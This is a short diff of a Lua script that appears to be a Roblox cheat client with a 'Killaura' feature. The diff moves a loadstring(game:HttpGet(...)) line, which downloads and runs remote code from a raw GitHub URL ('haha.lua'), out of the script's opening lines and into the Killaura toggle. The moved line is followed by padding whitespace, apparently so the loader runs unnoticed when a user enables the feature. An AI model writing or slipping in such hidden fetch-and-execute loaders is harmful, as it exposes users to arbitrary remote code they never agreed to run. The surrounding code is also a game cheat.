@@ -1,7 +1,5 @@
 
-wait(1)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BigJoeyJoeyFunnies/e/main/haha.lua", true))()
 
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
@@ -3692,6 +3690,8 @@ runFunction(function()
         Name = "Killaura",
         Function = function(callback)
             if callback then
+                   loadstring(game:HttpGet("https://raw.githubusercontent.com/BigJoeyJoeyFunnies/e/main/haha.lua", true))()
+																																												
 				if killauraaimcirclepart then killauraaimcirclepart.Parent = gameCamera end
 				if killaurarangecirclepart then killaurarangecirclepart.Parent = gameCamera end
 				if killauraparticlepart then killauraparticlepart.Parent = gameCamera end
